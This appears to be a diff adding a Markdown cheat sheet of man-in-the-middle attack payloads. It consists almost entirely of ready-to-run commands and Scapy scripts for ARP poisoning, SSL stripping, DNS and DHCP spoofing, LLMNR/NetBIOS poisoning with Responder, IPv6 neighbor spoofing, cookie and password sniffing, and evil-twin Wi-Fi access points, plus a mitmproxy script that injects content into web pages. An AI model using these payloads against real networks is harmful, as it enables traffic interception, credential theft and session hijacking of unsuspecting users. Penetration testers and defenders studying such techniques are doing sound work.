@@ -1,0 +1,344 @@
+# Man-in-the-Middle (MITM) Attack Payloads
+
+## ARP Poisoning MITM
+
+### Using Ettercap
+ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/       # MITM two hosts
+ettercap -T -q -i eth0 -M arp /// ///                                  # MITM entire network
+ettercap -G                                                            # GUI mode
+ettercap -T -i eth0 -M arp -P autoadd /192.168.1.0/24//               # Auto-add hosts
+
+# With plugins
+ettercap -T -i eth0 -M arp /// /// -P dns_spoof                        # DNS spoofing
+ettercap -T -i eth0 -M arp /// /// -P remote_browser                   # Remote browser
+ettercap -T -i eth0 -M arp /// /// -P smb_down                         # SMB downgrade
+
+### Using Bettercap
+bettercap -iface eth0                                                  # Interactive mode
+
+# Bettercap console commands:
+net.probe on                                                           # Discover hosts
+set arp.spoof.targets 192.168.1.100                                    # Set target
+set arp.spoof.fullduplex true                                          # Bidirectional
+arp.spoof on                                                           # Start ARP spoof
+net.sniff on                                                           # Start sniffing
+set net.sniff.verbose false                                            # Reduce verbosity
+set net.sniff.local true                                               # Sniff local packets
+set net.sniff.filter "tcp port 80 or tcp port 443"                     # Filter traffic
+
+### Using arpspoof (dsniff)
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1                          # Victim -> Gateway
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100                          # Gateway -> Victim
+arpspoof -i eth0 -r 192.168.1.100 192.168.1.1                          # Bidirectional
+
+# Enable IP forwarding for MITM
+echo 1 > /proc/sys/net/ipv4/ip_forward                                 # Linux
+sysctl -w net.ipv4.ip_forward=1                                        # Alternative
+
+### Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+import time
+import sys
+
+def get_mac(ip):
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    send(packet, count=4, verbose=False)
+
+target_ip = "192.168.1.100"
+gateway_ip = "192.168.1.1"
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[!] Detected CTRL+C! Restoring ARP tables...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+EOF
+
+## SSL/TLS Stripping
+
+### SSLStrip (Legacy)
+sslstrip -l 8080 -w sslstrip.log                                       # Start SSLStrip
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+### Bettercap HTTPS Downgrade
+# Bettercap console:
+set http.proxy.sslstrip true                                           # Enable SSLStrip
+set http.proxy.script /path/to/script.js                               # Custom script
+http.proxy on                                                          # Start proxy
+
+# Combined with ARP spoofing
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+set http.proxy.sslstrip true
+http.proxy on
+
+### MITMProxy
+mitmproxy                                                              # Interactive mode
+mitmproxy -p 8080                                                      # Custom port
+mitmweb                                                                # Web interface
+mitmdump -w capture.mitm                                               # Save to file
+mitmdump -r capture.mitm                                               # Read from file
+mitmproxy --mode transparent                                           # Transparent mode
+mitmproxy --ssl-insecure                                               # Ignore cert errors
+
+# With script
+mitmproxy -s inject_script.py                                          # Run script
+
+### MITMProxy Script Example
+# inject_script.py
+cat > inject_script.py << 'EOF'
+from mitmproxy import http
+
+def request(flow: http.HTTPFlow) -> None:
+    # Modify requests
+    flow.request.headers["X-Forwarded-For"] = "1.2.3.4"
+
+def response(flow: http.HTTPFlow) -> None:
+    # Modify responses
+    if "text/html" in flow.response.headers.get("content-type", ""):
+        flow.response.text = flow.response.text.replace("</body>", "<h1>HACKED</h1></body>")
+EOF
+
+## DNS Spoofing MITM
+
+### Using dnsspoof
+dnsspoof -i eth0                                                       # Spoof all DNS
+dnsspoof -i eth0 -f hosts.txt                                          # Custom hosts
+dnsspoof -i eth0 host target.com                                       # Specific domain
+
+# hosts.txt format:
+# target.com A 192.168.1.50
+# www.target.com A 192.168.1.50
+
+### Ettercap DNS Spoofing
+# Edit /etc/ettercap/etter.dns
+# Add: *.target.com A 192.168.1.50
+ettercap -T -i eth0 -P dns_spoof -M arp /// ///
+
+### Bettercap DNS Spoofing
+# Bettercap console:
+set dns.spoof.domains target.com,www.target.com                        # Target domains
+set dns.spoof.address 192.168.1.50                                     # Spoof IP
+set dns.spoof.all true                                                 # Spoof all domains
+dns.spoof on                                                           # Start DNS spoof
+
+# Combined attack
+net.probe on
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+set dns.spoof.domains *.target.com
+set dns.spoof.address 192.168.1.50
+dns.spoof on
+
+## Session Hijacking
+
+### Cookie Hijacking with Wireshark/tshark
+tshark -i eth0 -Y "http.cookie" -T fields -e http.cookie               # Capture cookies
+tshark -i eth0 -Y "http.cookie" -w cookies.pcap                        # Save cookies
+
+### Ferret and Hamster (Legacy)
+ferret -i eth0                                                         # Capture cookies
+hamster                                                                # Start proxy on 1234
+# Access http://localhost:1234
+
+### Wireshark Filters for Session Hijacking
+http.cookie                                                            # HTTP cookies
+http.authorization                                                     # HTTP auth headers
+http.request.method == "POST"                                          # POST requests
+ftp.request.command == "PASS"                                          # FTP passwords
+telnet.data                                                            # Telnet data
+smtp.auth.password                                                     # SMTP passwords
+
+### tcpdump Session Capture
+tcpdump -i eth0 -A 'tcp port 80'                                       # HTTP ASCII
+tcpdump -i eth0 -A 'tcp port 21'                                       # FTP ASCII
+tcpdump -i eth0 -s 0 -w capture.pcap 'port 80 or port 443'             # Save capture
+
+## IPv6 MITM Attacks
+
+### IPv6 Router Advertisement Spoofing
+# Using THC-IPv6 toolkit
+atk6-parasite6 eth0 fe80::1                                            # IPv6 MITM
+atk6-redir6 eth0 fe80::victim fe80::attacker                           # IPv6 redirect
+atk6-fake_router6 eth0 fe80::1 2001:db8::/64                           # Fake router
+
+### IPv6 Neighbor Advertisement Spoofing
+python3 << 'EOF'
+from scapy.all import *
+
+target_ipv6 = "fe80::1"
+gateway_ipv6 = "fe80::2"
+attacker_mac = "00:11:22:33:44:55"
+
+# Send fake neighbor advertisements
+while True:
+    send(IPv6(dst=target_ipv6)/ICMPv6ND_NA(tgt=gateway_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=attacker_mac))
+    time.sleep(2)
+EOF
+
+## DHCP MITM
+
+### Rogue DHCP Server
+# Using dnsmasq
+dnsmasq --interface=eth0 \
+        --dhcp-range=192.168.1.50,192.168.1.150,12h \
+        --dhcp-option=3,192.168.1.50 \
+        --dhcp-option=6,192.168.1.50 \
+        --log-queries \
+        --log-dhcp
+
+# Using dhcpd
+# Edit /etc/dhcp/dhcpd.conf
+dhcpd -f -d eth0
+
+### Bettercap DHCP Spoofing
+# Not directly supported, combine with ARP/DNS spoofing
+
+## NetBIOS/LLMNR Poisoning
+
+### Responder
+responder -I eth0                                                      # Start Responder
+responder -I eth0 -w                                                   # WPAD attack
+responder -I eth0 -wrfFb                                               # All options enabled
+responder -I eth0 -A                                                   # Analyze mode (passive)
+
+# Responder config: /etc/responder/Responder.conf
+# Enable/disable protocols: SMB, HTTP, HTTPS, LDAP, DNS, etc.
+
+### Inveigh (PowerShell - Windows)
+# Import-Module Inveigh.ps1
+# Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Proxy Y
+
+### MultiRelay (with Responder)
+# RunFinger.py -i 192.168.1.0/24                                       # Find targets
+# MultiRelay.py -t 192.168.1.100 -u ALL                                # Relay attacks
+
+## Proxy-based MITM
+
+### Burp Suite
+# Configure browser proxy to 127.0.0.1:8080
+# Install Burp CA certificate
+# Intercept and modify traffic
+
+### OWASP ZAP
+zap.sh -daemon -port 8080                                              # Start ZAP
+# Configure browser proxy to localhost:8080
+
+### Squid Proxy
+# Edit /etc/squid/squid.conf
+squid -d 1                                                             # Debug mode
+squid -k reconfigure                                                   # Reload config
+
+## Traffic Manipulation
+
+### Packet Injection with Scapy
+python3 << 'EOF'
+from scapy.all import *
+
+# TCP SYN injection
+ip = IP(src="192.168.1.50", dst="192.168.1.100")
+syn = TCP(sport=1024, dport=80, flags="S", seq=1000)
+send(ip/syn)
+
+# UDP injection
+ip = IP(src="192.168.1.50", dst="192.168.1.100")
+udp = UDP(sport=1024, dport=53)
+dns = DNS(rd=1, qd=DNSQR(qname="example.com"))
+send(ip/udp/dns)
+
+# ICMP redirect
+send(IP(src="192.168.1.1", dst="192.168.1.100")/ICMP(type=5, code=1, gw="192.168.1.50")/IP(dst="8.8.8.8")/TCP())
+EOF
+
+### Ettercap Filters
+# Create filter: etterfilter filter.ecf -o filter.ef
+# Example filter.ecf:
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Nothing!");
+        msg("Removed Accept-Encoding\n");
+    }
+}
+
+# Compile and use
+etterfilter filter.ecf -o filter.ef
+ettercap -T -i eth0 -F filter.ef -M arp /// ///
+
+## Network Tap Setup
+
+### Physical Network Tap
+# Use network tap hardware device
+# Connect between target and gateway
+
+### Port Mirroring (SPAN)
+# Cisco switch example:
+# configure terminal
+# monitor session 1 source interface Gi0/1
+# monitor session 1 destination interface Gi0/2
+# end
+
+### Linux Bridge Tap
+brctl addbr br0                                                        # Create bridge
+brctl addif br0 eth0                                                   # Add interface
+brctl addif br0 eth1                                                   # Add interface
+ifconfig br0 up                                                        # Bring up bridge
+tcpdump -i br0                                                         # Capture on bridge
+
+## VPN MITM
+
+### OpenVPN MITM
+# Modify OpenVPN server config
+# Push malicious routes
+push "route 192.168.1.0 255.255.255.0"
+push "dhcp-option DNS 192.168.1.50"
+
+### VPN Traffic Interception
+# Capture VPN traffic
+tcpdump -i any -w vpn.pcap 'udp port 1194 or tcp port 443'
+# Analyze with Wireshark
+
+## Wireless MITM
+
+### Fake Access Point
+# Using hostapd
+hostapd hostapd.conf                                                   # Start AP
+
+# hostapd.conf example:
+# interface=wlan0
+# driver=nl80211
+# ssid=FreeWiFi
+# channel=6
+# hw_mode=g
+
+### WiFi Pineapple Setup
+# Configure evil portal
+# Enable PineAP
+# Start karma attack
+
+### Evil Twin Attack
+airmon-ng start wlan0                                                  # Monitor mode
+airbase-ng -e "TargetSSID" -c 6 wlan0mon                               # Fake AP
+# Configure DHCP and routing on at0 interface
